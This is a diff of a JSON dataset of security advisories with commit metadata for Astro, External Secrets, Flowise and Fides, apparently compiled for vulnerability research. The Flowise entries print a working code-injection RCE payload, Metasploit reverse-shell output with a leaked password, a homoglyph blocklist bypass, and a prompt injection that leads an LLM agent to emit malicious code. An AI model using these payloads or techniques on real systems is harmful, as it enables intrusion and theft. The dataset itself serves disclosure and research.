+    "subject": "Fix wildcard hostname matching to reject hostnames without dots (#14787)",
+    "published": "2025-11-19T20:09:12Z",
+    "overlap_files": [
+      "packages/astro/test/units/remote-pattern.test.js",
+      "packages/internal-helpers/src/remote.ts"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/11/GHSA-fvmw-cj7j-j39q/GHSA-fvmw-cj7j-j39q.json",
+    "advisory": {
+      "id": "GHSA-fvmw-cj7j-j39q",
+      "summary": "Astro Cloudflare adapter has Stored Cross-site Scripting vulnerability in /_image endpoint",
+      "details": "**Summary**  \nA Cross-Site Scripting (XSS) vulnerability exists in Astro when using the **@astrojs/cloudflare** adapter with `output: 'server'`. The built-in image optimization endpoint (`/_image`) uses `isRemoteAllowed()` from Astro\u2019s internal helpers, which **unconditionally allows `data:` URLs**. When the endpoint receives a valid `data:` URL pointing to a malicious SVG containing JavaScript, and the Cloudflare-specific implementation performs a **302 redirect back to the original `data:` URL**, the browser directly executes the embedded JavaScript. This completely bypasses any domain allow-listing (`image.domains` / `image.remotePatterns`) and typical Content Security Policy mitigations.\n\n**Affected Versions**  \n- `@astrojs/cloudflare` \u2264 12.6.10 (and likely all previous versions)  \n- Astro \u2265 4.x when used with `output: 'server'` and the Cloudflare adapter\n\n**Root Cause \u2013 Vulnerable Code**  \nFile: `node_modules/@astrojs/internal-helpers/src/remote.ts`\n\n```ts\nexport function isRemoteAllowed(src: string, ...): boolean {\n  if (!URL.canParse(src)) {\n    return false;\n  }\n  const url = new URL(src);\n\n  // Data URLs are always allowed \n  if (url.protocol === 'data:') {\n    return true;\n  }\n\n  // Non-http(s) protocols are never allowed\n  if (!['http:', 'https:'].includes(url.protocol)) {\n    return false;\n  }\n  // ... further http/https allow-list checks\n}\n```\n\nIn the **Cloudflare adapter**, the `/_image` endpoint contains logic similar to:\n\n```ts\n\tconst href = ctx.url.searchParams.get('href');\n\tif (!href) {\n\t\t// return error \n\t}\n\n\tif (isRemotePath(href)) {\n\t\tif (isRemoteAllowed(href, imageConfig) === false) {\n\t\t\t// return error\n\t\t} else {\n            //redirect to return the image \n\t\t\treturn Response.redirect(href, 302);\n\t\t}\n\t}\n```\n\nBecause `data:` URLs are considered \u201call",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2025-65019"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-79"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2025-11-19T17:15:53Z"
+      },
+      "affected_packages": [
+        {
+          "name": "astro",
+          "ecosystem": "npm"
+        }
+      ],
+      "refs": [
+        "https://github.com/withastro/astro/security/advisories/GHSA-fvmw-cj7j-j39q",
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-65019",
+        "https://github.com/withastro/astro/commit/9e9c528191b6f5e06db9daf6ad26b8f68016e533",
+        "https://github.com/withastro/astro"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/withastro__astro",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "0f75f6bc637d547e07324e956db21d9f245a3e8e\n504958fe7fccd7bffc177a1f4b1bf4e22989470e\nFix wildcard hostname matching to reject hostnames without dots (#14787)\n\n* Fix wildcard hostname matching to reject hostnames without dots\n\n* Update .changeset/fix-wildcard-hostname-matching.md\n\nCo-authored-by: Florian Lefebvre <contact@florian-lefebvre.dev>\n\n---------\n\nCo-authored-by: Florian Lefebvre <contact@florian-lefebvre.dev>\n",
+    "fix_msg": "9e9c528191b6f5e06db9daf6ad26b8f68016e533\nebf44ecc16a02a20df2b0fd39d272b5398121801\nfix: require explicit authorization to use data urls (#14791)\n\n* fix: require explicit authorization to use data urls\n\n* chore: changeset\n\n* fix: extend tests\n\n* fix: tests\n\n* fix: test\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "504958fe7fccd7bffc177a1f4b1bf4e22989470e"
+    ],
+    "fix_parents": [
+      "ebf44ecc16a02a20df2b0fd39d272b5398121801"
+    ]
+  },
+  {
+    "case_id": "GHSA-FCXQ-V2R3-CC8H",
+    "repository": "external-secrets/external-secrets",
+    "fix_ref": "39cdba5863533007b582dc63dd300839326b2f1d",
+    "ai_ancestor": "de40e8f4fa9559c1d770bb674589b285da5ef2d1",
+    "subject": "fix: select secretstores in same ns as pushsecret (#5109)",
+    "published": "2025-08-13T19:45:15Z",
+    "overlap_files": [
+      "pkg/controllers/pushsecret/pushsecret_controller.go",
+      "pkg/controllers/pushsecret/pushsecret_controller_test.go"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/08/GHSA-fcxq-v2r3-cc8h/GHSA-fcxq-v2r3-cc8h.json",
+    "advisory": {
+      "id": "GHSA-fcxq-v2r3-cc8h",
+      "summary": "External Secrets Operator's Missing Namespace Restriction Allows Unauthorized Secret Access",
+      "details": "## Summary\nA vulnerability was discovered in the External Secrets Operator where the `List()` calls for Kubernetes Secret and SecretStore resources performed by the `PushSecret` controller did not apply a namespace selector.  \nThis flaw allowed an attacker to use label selectors to list and read secrets/secret-stores across the cluster, bypassing intended namespace restrictions.\n\n---\n\n## Impact\nAn attacker with the ability to create or update `PushSecret` resources and control `SecretStore` configurations could exploit this vulnerability to exfiltrate sensitive data from arbitrary namespaces.  \nThis could lead to full disclosure of Kubernetes secrets, including credentials, tokens, and other sensitive information stored in the cluster.\n\n---\n\n## Exploitability\nTo exploit this vulnerability, an attacker must:\n\n1. Have permissions to create or update `PushSecret` resources.\n2. Control one or more `SecretStore` resources.\n\nWith these conditions met, the attacker could leverage label selectors to list secrets from any namespace and retrieve their contents.\n\n---\n\n## Affected Versions\n- **Vulnerable:** v0.15.0 \u2013 v0.19.1  \n- **Not Vulnerable:** v0.19.2 and later  \n\n---\n\n## Fix\nThe vulnerability was addressed in v0.19.2 by adding namespace restrictions to the `List()` calls for both `PushSecret` and `SecretStore` controllers.  \nThis ensures that only secrets in the intended namespace are accessible.\n\nRelevant fixes:\n- [#5133](https://github.com/external-secrets/external-secrets/pull/5133) \u2013 Enforce namespace selector for PushSecret `List()` calls  \n- [#5109](https://github.com/external-secrets/external-secrets/pull/5109) \u2013 Enforce namespace selector for SecretStore `List()` calls  \n\n---\n\n## Mitigation\nIf upgrading to v0.19.2 or later is not immediately possible, the following mi",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2025-55196"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-284"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2025-08-13T23:15:27Z"
+      },
+      "affected_packages": [
+        {
+          "name": "github.com/external-secrets/external-secrets",
+          "ecosystem": "Go"
+        }
+      ],
+      "refs": [
+        "https://github.com/external-secrets/external-secrets/security/advisories/GHSA-fcxq-v2r3-cc8h",
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-55196",
+        "https://github.com/external-secrets/external-secrets/pull/5109",
+        "https://github.com/external-secrets/external-secrets/pull/5133",
+        "https://github.com/external-secrets/external-secrets/commit/39cdba5863533007b582dc63dd300839326b2f1d",
+        "https://github.com/external-secrets/external-secrets/commit/de40e8f4fa9559c1d770bb674589b285da5ef2d1",
+        "https://github.com/external-secrets/external-secrets"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/external-secrets__external-secrets",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "de40e8f4fa9559c1d770bb674589b285da5ef2d1\n66cd5667c41b69622e7695023660bd367d946c7d\nfix: select secretstores in same ns as pushsecret (#5109)\n\nSigned-off-by: Grace Do <xgrace@gmail.com>\nCo-authored-by: Gergely Brautigam <182850+Skarlso@users.noreply.github.com>\nCo-authored-by: Moritz Johner <moolen@users.noreply.github.com>\n",
+    "fix_msg": "39cdba5863533007b582dc63dd300839326b2f1d\nde40e8f4fa9559c1d770bb674589b285da5ef2d1\nfix: scope secret list call to the namespace the push secret was created (#5133)\n\n\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "66cd5667c41b69622e7695023660bd367d946c7d"
+    ],
+    "fix_parents": [
+      "de40e8f4fa9559c1d770bb674589b285da5ef2d1"
+    ]
+  },
+  {
+    "case_id": "GHSA-4J8X-X6V7-W9RQ",
+    "repository": "FlowiseAI/Flowise",
+    "fix_ref": "f4e2794f6a576b94578f2fdafbf49c2fb304626c",
+    "ai_ancestor": "42d593f8ca854471059051a7fdd89bf8d8ab7c12",
+    "subject": "Fix Flowise 591 (#6476)",
+    "published": "2026-08-04T17:43:48Z",
+    "overlap_files": [
+      "packages/components/src/pythonCodeValidator.test.ts",
+      "packages/components/src/pythonCodeValidator.ts"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2026/08/GHSA-4j8x-x6v7-w9rq/GHSA-4j8x-x6v7-w9rq.json",
+    "advisory": {
+      "id": "GHSA-4j8x-x6v7-w9rq",
+      "summary": "Flowise: RCE via CSVAgent csvFile data URI base64 segment is interpolated into Python source without validation",
+      "details": "### Summary\nFlowise's `CSVAgent` interpolates an attacker-controlled segment of the\n`csvFile` data URI directly into a Python source-code template that is then\nexecuted by Pyodide. Because Pyodide is loaded with the default `js` bridge\nto `globalThis` (which on Node.js exposes `eval` and dynamic `import()`), the\nattacker can break out of the Python string literal, hand a JS string to\n`js.eval`, dynamically import any Node built-in module (`fs`, `child_process`,\n\u2026), and execute arbitrary file I/O or OS commands as the Flowise process.\nThe two validator paths around this code (`validatePythonCodeForDataFrame`\nand `validateCustomReadCSVFunction`) are never applied to the bootstrap\ntemplate.\n\nA workspace user with `chatflows:create` (or any `agentflows`/`chatflows`\nupdate permission) plants a CSV Agent node with a crafted `csvFile`. Once the\nchatflow is exposed via the (whitelisted, public) `POST /api/v1/prediction/:id`\nendpoint, *any unauthenticated* request triggers the host RCE.\n\n### Details\n\n**Vulnerable file:** `packages/components/nodes/agents/CSVAgent/CSVAgent.ts`\n\nThe `run()` method extracts the file segment from the data URI by splitting on\n`,` and using two `pop()` calls (lines 127\u2013138):\n\n```ts\n} else {\n    if (csvFileBase64.startsWith('[') && csvFileBase64.endsWith(']')) {\n        files = JSON.parse(csvFileBase64)\n    } else {\n        files = [csvFileBase64]\n    }\n\n    for (const file of files) {\n        if (!file) continue\n        const splitDataURI = file.split(',')\n        splitDataURI.pop()                           // discards trailing filename segment\n        base64String += splitDataURI.pop() ?? ''     // captures the segment we attack\n    }\n}\n```\n\nThe captured `base64String` is then **interpolated verbatim** into a Python\nsource string at lines 156\u2013171:\n\n",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2026-69264"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-94",
+          "CWE-95"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": null
+      },
+      "affected_packages": [
+        {
+          "name": "flowise",
+          "ecosystem": "npm"
+        },
+        {
+          "name": "flowise-components",
+          "ecosystem": "npm"
+        }
+      ],
+      "refs": [
+        "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-4j8x-x6v7-w9rq",
+        "https://github.com/FlowiseAI/Flowise/pull/6499",
+        "https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c",
+        "https://github.com/FlowiseAI/Flowise",
+        "https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/FlowiseAI__Flowise",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "42d593f8ca854471059051a7fdd89bf8d8ab7c12\na4c4e4988cded15edf725e762560575b889ae351\nFix Flowise 591 (#6476)\n\n* fix(flowise-591): Unicode homoglyph bypass\n\n* Update packages/components/src/pythonCodeValidator.ts\n\nCo-authored-by: gemini-code-assist[bot] <176961590+gemini-code-assist[bot]@users.noreply.github.com>\n\n* fix gemini lint error\n\n* fix: strip backslash line-continuation sequences in validator normalization to close eval bypass\n\n---------\n\nCo-authored-by: gemini-code-assist[bot] <176961590+gemini-code-assist[bot]@users.noreply.github.com>\n",
+    "fix_msg": "f4e2794f6a576b94578f2fdafbf49c2fb304626c\n42d593f8ca854471059051a7fdd89bf8d8ab7c12\nFix Flowise 606 (#6499)\n\nfix(flowise-606): remove AirtableAgent and CSVAgent due to security vulnerabilities\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "a4c4e4988cded15edf725e762560575b889ae351"
+    ],
+    "fix_parents": [
+      "42d593f8ca854471059051a7fdd89bf8d8ab7c12"
+    ]
+  },
+  {
+    "case_id": "GHSA-52FH-8V99-63C2",
+    "repository": "FlowiseAI/Flowise",
+    "fix_ref": "f4e2794f6a576b94578f2fdafbf49c2fb304626c",
+    "ai_ancestor": "42d593f8ca854471059051a7fdd89bf8d8ab7c12",
+    "subject": "Fix Flowise 591 (#6476)",
+    "published": "2026-08-04T17:31:09Z",
+    "overlap_files": [
+      "packages/components/src/pythonCodeValidator.test.ts",
+      "packages/components/src/pythonCodeValidator.ts"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2026/08/GHSA-52fh-8v99-63c2/GHSA-52fh-8v99-63c2.json",
+    "advisory": {
+      "id": "GHSA-52fh-8v99-63c2",
+      "summary": "Flowise: Pyodide validator Unicode homoglyph bypass leads to RCE",
+      "details": "### Summary\nThe validatePythonCodeForDataFrame blacklist in packages/components/src/pythonCodeValidator.ts can be bypassed with Unicode homoglyph identifiers, allowing arbitrary Python execution inside Pyodide and full OS command execution on the Flowise host via Pyodide's js module interop. This reopens the RCE paths patched as GHSA-3hjv-c53m-58jj (CSV Agent) and GHSA-v38x-c887-992f (Airtable Agent).\n\n### Details\npackages/components/src/pythonCodeValidator.ts gates every call to pyodide.runPythonAsync in packages/components/nodes/agents/CSVAgent/CSVAgent.ts (lines 147, 198) and packages/components/nodes/agents/AirtableAgent/AirtableAgent.ts (line 186). The gate is a regex blacklist:\n\n```ts\n{ pattern: /\\bimport\\b/g, ... },\n{ pattern: /\\b__class__\\b/g, ... },\n{ pattern: /\\b__subclasses__\\s*\\(/g, ... },\n{ pattern: /\\b__builtins__\\b/g, ... },\n{ pattern: /\\b__mro__\\b/g, ... },\n// ... about 30 similar rules\n```\n\nTwo design flaws combine into a bypass:\n\n1. JavaScript regex `\\b` is ASCII-only. Word boundaries are computed against the ASCII word class `[A-Za-z0-9_]`. A Unicode letter such as U+1D41A (mathematical bold small a) is treated as a non-word character, so `\\b__class__\\b` never matches `__cl\ud835\udc1ass__`.\n2. Python 3 (PEP 3131) NFKC-normalizes every identifier at parse time. `__cl\ud835\udc1ass__`, `__subcl\ud835\udc1asses__`, `__b\ud835\udc1ase__`, `__b\ud835\udc2eiltins__`, and similar homoglyph forms are all parsed as their ASCII equivalents.\n\nAttribute access `obj.__cl\ud835\udc1ass__` is normalized because attribute names are identifiers. Dict string keys such as `bi['__import__']` are not normalized, but they are free text and can be assembled with `chr()` to avoid literal matches on patterns like `\\bimport\\b` or `\\b__import__\\s*\\(/`.\n\nFrom inside Pyodide, `__builtins__['__import__']('js')` yields the JS host bridge. In the",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2026-70470"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-184"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": null
+      },
+      "affected_packages": [
+        {
+          "name": "flowise",
+          "ecosystem": "npm"
+        },
+        {
+          "name": "flowise-components",
+          "ecosystem": "npm"
+        }
+      ],
+      "refs": [
+        "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-52fh-8v99-63c2",
+        "https://github.com/FlowiseAI/Flowise/pull/6499",
+        "https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c",
+        "https://github.com/FlowiseAI/Flowise",
+        "https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/FlowiseAI__Flowise",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "42d593f8ca854471059051a7fdd89bf8d8ab7c12\na4c4e4988cded15edf725e762560575b889ae351\nFix Flowise 591 (#6476)\n\n* fix(flowise-591): Unicode homoglyph bypass\n\n* Update packages/components/src/pythonCodeValidator.ts\n\nCo-authored-by: gemini-code-assist[bot] <176961590+gemini-code-assist[bot]@users.noreply.github.com>\n\n* fix gemini lint error\n\n* fix: strip backslash line-continuation sequences in validator normalization to close eval bypass\n\n---------\n\nCo-authored-by: gemini-code-assist[bot] <176961590+gemini-code-assist[bot]@users.noreply.github.com>\n",
+    "fix_msg": "f4e2794f6a576b94578f2fdafbf49c2fb304626c\n42d593f8ca854471059051a7fdd89bf8d8ab7c12\nFix Flowise 606 (#6499)\n\nfix(flowise-606): remove AirtableAgent and CSVAgent due to security vulnerabilities\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "a4c4e4988cded15edf725e762560575b889ae351"
+    ],
+    "fix_parents": [
+      "42d593f8ca854471059051a7fdd89bf8d8ab7c12"
+    ]
+  },
+  {
+    "case_id": "GHSA-5XVG-PMGG-3MXR",
+    "repository": "FlowiseAI/Flowise",
+    "fix_ref": "f4e2794f6a576b94578f2fdafbf49c2fb304626c",
+    "ai_ancestor": "42d593f8ca854471059051a7fdd89bf8d8ab7c12",
+    "subject": "Fix Flowise 591 (#6476)",
+    "published": "2026-08-04T19:29:26Z",
+    "overlap_files": [
+      "packages/components/src/pythonCodeValidator.test.ts",
+      "packages/components/src/pythonCodeValidator.ts"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2026/08/GHSA-5xvg-pmgg-3mxr/GHSA-5xvg-pmgg-3mxr.json",
+    "advisory": {
+      "id": "GHSA-5xvg-pmgg-3mxr",
+      "summary": "Flowise: CSV Agent Prompt Injection Remote Code Execution Vulnerability",
+      "details": "-- ABSTRACT -------------------------------------\n\nTrend Micro's Zero Day Initiative has identified a vulnerability affecting the following products:\nFlowise - Flowise\n\n-- VULNERABILITY DETAILS ------------------------\n* Version tested: 3.1.1\n* Installer file: https://github.com/FlowiseAI/Flowise (npm install flowise@3.1.1)\n* Platform tested: Ubuntu 25.10\n\n---\n\nA prompt injection sent to a chatflow using a CSV Agent node can cause the LLM to respond with a malicious Python script that bypasses the blocklist validator and executes in an unsandboxed pyodide environment. An attacker can leverage this to execute arbitrary code in the context of the user running the server.\n\n```\nThis vulnerability allows remote attackers to execute arbitrary code on affected installations of Flowise. Authentication is not required to exploit this vulnerability.\n\nThe specific flaw exists within the run method of the CSV_Agents class. The issue results from insufficient input sanitization when using untrusted data to construct an LLM prompt. An attacker can leverage this vulnerability to execute code in the context of the service account.\n```\n\n### Analysis\n\nWhen a user makes a query against a chatflow using the CSV Agent node, the `run` method of the `CSV_Agents` class is called. This method reads the CSV file, loads a pyodide environment, and uses pandas to extract column names and data types into a dictionary. It then constructs a system prompt using that dictionary and the user's input, and sends this prompt to a configured LLM. The LLM response is stored in a variable named `pythonCode`. The method then attempts to validate this value using `validatePythonCodeForDataFrame` from `packages/components/src/pythonCodeValidator.ts` before evaluating it in pyodide.\n\nThe validator relies on a stat",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2026-70477"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-94"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": null
+      },
+      "affected_packages": [
+        {
+          "name": "flowise",
+          "ecosystem": "npm"
+        },
+        {
+          "name": "flowise-components",
+          "ecosystem": "npm"
+        }
+      ],
+      "refs": [
+        "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5xvg-pmgg-3mxr",
+        "https://github.com/FlowiseAI/Flowise/pull/6499",
+        "https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c",
+        "https://github.com/FlowiseAI/Flowise",
+        "https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/FlowiseAI__Flowise",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "42d593f8ca854471059051a7fdd89bf8d8ab7c12\na4c4e4988cded15edf725e762560575b889ae351\nFix Flowise 591 (#6476)\n\n* fix(flowise-591): Unicode homoglyph bypass\n\n* Update packages/components/src/pythonCodeValidator.ts\n\nCo-authored-by: gemini-code-assist[bot] <176961590+gemini-code-assist[bot]@users.noreply.github.com>\n\n* fix gemini lint error\n\n* fix: strip backslash line-continuation sequences in validator normalization to close eval bypass\n\n---------\n\nCo-authored-by: gemini-code-assist[bot] <176961590+gemini-code-assist[bot]@users.noreply.github.com>\n",
+    "fix_msg": "f4e2794f6a576b94578f2fdafbf49c2fb304626c\n42d593f8ca854471059051a7fdd89bf8d8ab7c12\nFix Flowise 606 (#6499)\n\nfix(flowise-606): remove AirtableAgent and CSVAgent due to security vulnerabilities\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "a4c4e4988cded15edf725e762560575b889ae351"
+    ],
+    "fix_parents": [
+      "42d593f8ca854471059051a7fdd89bf8d8ab7c12"
+    ]
+  },
+  {
+    "case_id": "GHSA-VMV7-4M6C-3CG5",
+    "repository": "FlowiseAI/Flowise",
+    "fix_ref": "f4e2794f6a576b94578f2fdafbf49c2fb304626c",
+    "ai_ancestor": "42d593f8ca854471059051a7fdd89bf8d8ab7c12",
+    "subject": "Fix Flowise 591 (#6476)",
+    "published": "2026-08-04T15:40:28Z",
+    "overlap_files": [
+      "packages/components/src/pythonCodeValidator.test.ts",
+      "packages/components/src/pythonCodeValidator.ts"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2026/08/GHSA-vmv7-4m6c-3cg5/GHSA-vmv7-4m6c-3cg5.json",
+    "advisory": {
+      "id": "GHSA-vmv7-4m6c-3cg5",
+      "summary": "Flowise: CSV Agent Remote Code Execution via Pyodide Code Injection \u2014 Root Shell Verified",
+      "details": "## UPDATE 2026-05-20: Full RCE as root VERIFIED\n\n**This is not theoretical \u2014 a Meterpreter reverse shell session as root has been established on Flowise 3.1.2.**\n\n### Verified Exploit Chain\n\n1. Python code injection via `base64_string = \"${base64String}\"` (CSVAgent.ts line 161)\n2. Pyodide `js` bridge provides access to the host Node.js process\n3. `process.mainModule.constructor._load('child_process')` loads child_process (bypasses ESM require restriction)\n4. `.execSync('CMD')` executes arbitrary OS commands as **root** (PID 1 in container)\n\n### Working RCE Payload\n\n```\n\";import js;e=js.globalThis.eval;e(\"process.mainModule.constructor._load('child_process').execSync('id')\");#\n```\n\n**Constraint:** No commas allowed in payload \u2014 `csvFile.split(',')` splits on all commas.\n\n### Metasploit Session Proof\n\n```\nmsf > use exploit/multi/http/flowise_csv_agent_rce\nmsf > set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp\nmsf > exploit\n\n[+] Authentication successful\n[+] Created chatflow: b6716feb-63c8-4fd2-993f-cd43788704b4\n[*] Sending stage (3090404 bytes) to 172.17.0.2\n[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.17.0.2:41422)\n\nmeterpreter > getuid\nServer username: root\n\nmeterpreter > sysinfo\nComputer     : cbce3fb352b7\nOS           : Linux 6.8.0-111-generic\nArchitecture : x64\nMeterpreter  : x64/linux\n\nmeterpreter > shell\n# id\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)\n\n# uname -a\nLinux cbce3fb352b7 6.8.0-111-generic x86_64 Linux\n```\n\n### Additional Verified Impact\n\n**Credential Theft:**\n```\nFLOWISE_PASSWORD=admin123\nDATABASE_PATH=/root/.flowise\nAPIKEY_PATH=...\n```\n\n**Arbitrary File Read** via `process.binding('fs').readFileUtf8('/etc/hostname')` \u2192 `cbce3fb352b7`\n\n**Server DoS** \u2014 certain native binding calls (spawn_sync) crash the Node.j",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2026-69255"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-94"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": null
+      },
+      "affected_packages": [
+        {
+          "name": "flowise",
+          "ecosystem": "npm"
+        },
+        {
+          "name": "flowise-components",
+          "ecosystem": "npm"
+        }
+      ],
+      "refs": [
+        "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-vmv7-4m6c-3cg5",
+        "https://github.com/FlowiseAI/Flowise/pull/6499",
+        "https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c",
+        "https://github.com/FlowiseAI/Flowise",
+        "https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.3"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/FlowiseAI__Flowise",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "42d593f8ca854471059051a7fdd89bf8d8ab7c12\na4c4e4988cded15edf725e762560575b889ae351\nFix Flowise 591 (#6476)\n\n* fix(flowise-591): Unicode homoglyph bypass\n\n* Update packages/components/src/pythonCodeValidator.ts\n\nCo-authored-by: gemini-code-assist[bot] <176961590+gemini-code-assist[bot]@users.noreply.github.com>\n\n* fix gemini lint error\n\n* fix: strip backslash line-continuation sequences in validator normalization to close eval bypass\n\n---------\n\nCo-authored-by: gemini-code-assist[bot] <176961590+gemini-code-assist[bot]@users.noreply.github.com>\n",
+    "fix_msg": "f4e2794f6a576b94578f2fdafbf49c2fb304626c\n42d593f8ca854471059051a7fdd89bf8d8ab7c12\nFix Flowise 606 (#6499)\n\nfix(flowise-606): remove AirtableAgent and CSVAgent due to security vulnerabilities\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "a4c4e4988cded15edf725e762560575b889ae351"
+    ],
+    "fix_parents": [
+      "42d593f8ca854471059051a7fdd89bf8d8ab7c12"
+    ]
+  },
+  {
+    "case_id": "GHSA-HJFH-P8F5-24WR",
+    "repository": "ethyca/fides",
+    "fix_ref": "2ffd125e1089a09b84c27fb5279a05960cbf2452",
+    "ai_ancestor": "59903c195e2f9f8915a1db94950aefd557033a5c",
+    "subject": "Merge commit from fork",
+    "published": "2025-09-08T20:46:06Z",
+    "overlap_files": [
+      "CHANGELOG.md",
+      "src/fides/api/api/v1/endpoints/oauth_endpoints.py"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/09/GHSA-hjfh-p8f5-24wr/GHSA-hjfh-p8f5-24wr.json",
+    "advisory": {
+      "id": "GHSA-hjfh-p8f5-24wr",
+      "summary": "Fides Webserver API is Vulnerable to OAuth Client Privilege Escalation",
+      "details": "### Summary\nThe OAuth client creation and update endpoints of the Fides Webserver API do not properly authorize scope assignment. This allows highly privileged users with `client:create` or `client:update` permissions to escalate their privileges to owner-level.\n\n### Details\nWhen creating or updating OAuth clients, the API validates only that requested scopes exist in the system registry. It does not verify that the requester already possesses the scopes they are assigning, allowing these users to assign arbitrary scopes to OAuth clients.\n\n### Impact\nThis allows contributor-level users to escalate to owner-equivalent privileges, gaining access to user management, system configuration, and permission assignment capabilities they should not possess.\n\n### Patches\nThe vulnerability has been patched in Fides version `2.69.1`. Users are advised to upgrade to this version or later to secure their systems against this threat.\n\n### Workarounds\nThere are no workarounds.\n\n### Risk Level\nThis vulnerability has been assigned a severity of HIGH. Contributor users are already highly privileged, only a handful of scopes are not already available to them, but these scopes can be abused for high impact.",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
